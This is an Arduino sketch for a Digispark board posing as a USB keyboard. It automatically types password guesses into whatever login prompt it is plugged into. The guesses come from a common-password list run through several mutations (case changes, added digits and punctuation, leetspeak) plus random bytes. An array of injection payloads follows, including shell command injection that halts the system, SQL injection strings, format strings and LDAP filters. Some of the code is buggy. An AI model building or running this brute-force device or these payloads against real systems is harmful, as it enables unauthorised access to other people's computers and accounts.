#include "DigiKeyboard.h"

// XXX FIX KEYBOARD localiZATioN PRobLeM

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void guess(char *pwd, int keyb_delay)
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println(pwd);
  DigiKeyboard.delay(keyb_delay);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(2000);
}

void led_blink(int freq)
{
  // led off
  digitalWrite(1, LOW);

  // blink freq
  while(freq > 0)
  {
    digitalWrite(1, HIGH); //turn on led when program finishes
    DigiKeyboard.delay(100);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(100);
    freq--;
  }
  
  //DigiKeyboard.delay(2000);

  // turn led off
  //digitalWrite(1, LOW);

  return;
}

char *to_upper(char *tbuf, char *sbuf, size_t tsize)
{
  int j;
  for(j = 0; (sbuf[j] != '\0' && sbuf[j] != '\n') && j < tsize; j++)
  {
    // zero char
    tbuf[j] = 0;
    // test for alpha char and only convert them
    if(sbuf[j] >= 'a' && sbuf[j] <= 'z')
    {
      tbuf[j] = char(int(sbuf[j]) - 0x20);
    }
    else
    {
      tbuf[j] = sbuf[j];
    }
  }
  if(j == tsize)
    tbuf[j-1] = 0;
  else
    tbuf[j] = 0;
    
  return tbuf;
}

int cpy_str(char *tbuf, char *sbuf, size_t tsize)
{
  int j;
  for(j = 0; (sbuf[j] != '\0' && sbuf[j] != '\n') && j < tsize; j++)
  {
    tbuf[j] = sbuf[j];
  }
  
  if(j == tsize)
  {
    tbuf[j-1] = 0;
    return j-1;
  }
  else
  {
    tbuf[j] = 0;
    return j;
  }
}


void loop() {
  // use tools/create-pwdlist-array.sh
  char *pl[] = 
  {
    "password",
    "23456",
    "234567",
    "abc123",
    "querty",
    "monkez",
    "letmein",
    "dragon",
    "111111",
    "baseball",
    "ilovezou",
    "trustno1",
    "sunshine",
    "master",
    "123123",
    "welcome",
    "shadow",
    "football",
    "jesus",
    "ninja",
    "mustang",
     false
  };

  char *fuzz[] =
  {
    "../",
    "/../",
    ">",
    "<",
    "`",
    "$(",
    "|",
    "&",
    "exec",
    "eval",
    "&&",
    "||",
    "`halt`",
    "$(halt)",
    "|halt",
    "%0Ahalt",
    "&halt",
    " -",
    " --",
    "\n",
    "%i",
    "%p",
    "%s",
    "%n",
    "'';shutdown--",
    "';shutdown--",
    ";shutdown--",
    "test'--",
    "' OR 1=1",
    "' OR 1=1 --",
    "; cn=",
    "|(cn=",
    false
  };

  
  char    num[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
  char*   alpha   = "abcdefghijklmnopqrstuvwxyz";
  char*   punct   = ",.-;:_+*~#'!\"§$%&/()=?{[]}\\";
  int     i, j, k;


  // 1. common pwd list
  for(i = 0; pl[i]; i++)
  {
    guess(pl[i], 500);
    // blink led once to indicate first loop XXX this add a delay of (freq * 500 ms) but we blink while the system is doing the verification, maybe add this into guess()
    led_blink(1);
  }

  // 2. common pwd list, uppercase, complete
  for(i = 0; pl[i]; i++)
  {
    char p[20];
    to_upper(p, pl[i], sizeof(p));
    guess(p, 500);
    // blink led once to indicate first loop XXX this add a delay of (freq * 500 ms) but we blink while the system is doing the verification, maybe add this into guess()
    led_blink(2);
  }

  // 3. common pwd list, uppercase, first char
  for(i = 0; pl[i]; i++)
  {
    char p[20];
    
    if(pl[i][0] >= 'a' && pl[i][0] <= 'z')
    {
      int len = cpy_str(p, pl[i], sizeof(p));
      p[0] = char(int(p[0]) - 0x20);
      guess(p, 500);
      led_blink(3);
    }
  }

  // 4. common pwd list, uppercase, last char
  for(i = 0; pl[i]; i++)
  {
    char p[20];
    
    int len = cpy_str(p, pl[i], sizeof(p));
    if(pl[i][len-1] >= 'a' && pl[i][len-1] <= 'z')
    {
      p[len-1] = char(int(p[len-1]) - 0x20);
      guess(p, 500);
      led_blink(4);
    }
  }
  
  // 5. common pwd list, uppercase, first+last char
  for(i = 0; pl[i]; i++)
  {
    char p[20];
    
    int len = cpy_str(p, pl[i], sizeof(p));
    if( (pl[i][0] >= 'a' && pl[i][0] <= 'z') && (pl[i][len-1] >= 'a' && pl[i][len-1] <= 'z'))
    {
      p[0]     = char(int(p[0])     - 0x20);
      p[len-1] = char(int(p[len-1]) - 0x20);
      guess(p, 500);
      led_blink(5);
    }
  }

  // 6. common pwd list, 1 digit number front
  for(i = 0; pl[i]; i++)
  {
    for(j = 0; j < 10; j++)
    {
      char p[20];
      p[0] = num[j];
      cpy_str(&p[1], pl[i], sizeof(p)-1); // +-1 for the trailing digit
      guess(p, 500);
      led_blink(6);    
    }
  }
  
  // 7. common pwd list, number end
  for(i = 0; pl[i]; i++)
  {
    for(j = 0; j < 10; j++)
    {
      char p[20];
      int len = cpy_str(p, pl[i], sizeof(p));
      p[len] = num[j];
      p[len+1] = '\0';
      guess(p, 500);
      led_blink(7);    
    }
  }

  // 8. common pwd list, number front+end
  for(i = 0; pl[i]; i++)
  {
    for(j = 0; j < 10; j++)
    {
      char p[20];
      p[0] = num[j];
      int len = cpy_str(&p[1], pl[i], sizeof(p)-1);
      for(k = 0; k < 10; k++)
      {
        p[len+1] = num[k];
        p[len+2] = '\0';
        guess(p, 500);
        led_blink(8); 
      }    
    }
  }
  
  // 9. common pwd list, 1337
  for(i = 0; pl[i]; i++)
  {
    char p[20];
    int len = cpy_str(p, pl[i], sizeof(p));
    for(j = 0; j < len; j++)
    {
      if(p[j] == 'o' || p[j] == 'O')
        p[j] = '0';
      else if(p[j] == 'l' || p[j] == 'L')
        p[j] = '1';
      else if(p[j] == 'i' || p[j] == 'I')
        p[j] = '1';
      else if(p[j] == 'e' || p[j] == 'E')
        p[j] = '3';
      else if(p[j] == 's' || p[j] == 'S')
        p[j] = '5';
      else if(p[j] == 't' || p[j] == 'T')
        p[j] = '7';
    }
    // guess after changing all chars
    guess(p, 500);
    led_blink(9);
  }

  // 10. add punctional at the beginning
  for(i = 0; pl[i]; i++)
  {
    for(j = 0; j < strlen(punct); j++)
    {
      char p[20];
      p[0] = punct[j];
      cpy_str(&p[1], pl[i], sizeof(p)-1); // +-1 for the trailing digit
      guess(p, 500);
      led_blink(10);    
    }
  }
  
  // 11. punct at the end
  for(i = 0; pl[i]; i++)
  {
    int len = strlen(punct);
    for(j = 0; j < len; j++)
    {
      char p[20];
      int l = cpy_str(p, pl[i], sizeof(p));
      p[l]    = punct[j];
      p[l+1]  = '\0';
      guess(p, 500);
      led_blink(11);    
    }
  }
  
  // 12. punct at begin+end
  for(i = 0; pl[i]; i++)
  {
    int len = strlen(punct);
    for(j = 0; j < len; j++)
    {
      char p[20];
      p[0] = punct[j];
      int l = cpy_str(&p[1], pl[i], sizeof(p)-1); // +-1 for the trailing digit

      for(j = 0; j < len; j++)
      {
        p[l+1]  = punct[j];
        p[l+2]  = '\0';
        guess(p, 500);
        led_blink(12);    
      }
    }
  }
  
  
  // 13. fuzzing data
  /*for(i = 0; fuzz[i]; i++)
  {
    guess(fuzz[i], 500);
    led_blink(13);    
  }*/

  // 14. random binary data
  for(i = 0; i < 50; i++) // try 50 random data passwords
  {
    char p[20];
    // generate 20 byte random password
    for(j = 0; j < sizeof(p); j++)
    {
      p[j] = random(255);
    }
    //p[sizeof(p)-1] = '\0';
    guess(p, 500);
    led_blink(14);   
  }

  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.println("loop ended");
  DigiKeyboard.delay(5000);
}

/*  
   char *pl[] = 
  {
    "123abc",
    "654321",
    "666666",
    "696969",
    "aaaaaa",
    "abc123",
    "alberto",
    "alejandra",
    "alejandro",
    "amanda",
    "andrea",
    "angel",
    "angels",
    "anthony",
    "asdf",
    "asdfasdf",
    "ashley",
    "babygirl",
    "baseball",
    "basketball",
    "beatriz",
    "blahblah",
    "bubbles",
    "buster",
    "butterfly",
    "carlos",
    "charlie",
    "cheese",
    "chocolate",
    "computer",
    "daniel",
    "diablo",
    "dragon",
    "elite",
    "estrella",
    "flower",
    "football",
    "forum",
    "freedom",
    "friends",
    "fuckyou",
    "hello",
    "hunter",
    "iloveu",
    "iloveyou",
    "internet",
    "jennifer",
    "jessica",
    "jesus",
    "jordan",
    "joshua",
    "justin",
    "killer",
    "letmein",
    "liverpool",
    "lovely",
    "loveme",
    "loveyou",
    "master",
    "matrix",
    "merlin",
    "monkey",
    "mustang",
    "nicole",
    "nothing",
    "number1",
    "pass",
    "passport",
    "password",
    "password1",
    "playboy",
    "pokemon",
    "pretty",
    "princess",
    "purple",
    "pussy",
    "qazwsx",
    "qwerty",
    "roberto",
    "sebastian",
    "secret",
    "shadow",
    "shit",
    "soccer",
    "starwars",
    "sunshine",
    "superman",
    "tequiero",
    "test",
    "testing",
    "trustno1",
    "tweety",
    "welcome",
    "westside",
    "whatever",
    "windows",
    "writer",
    "zxcvbnm",
    "zxczxc",
     false
  };
  */
  
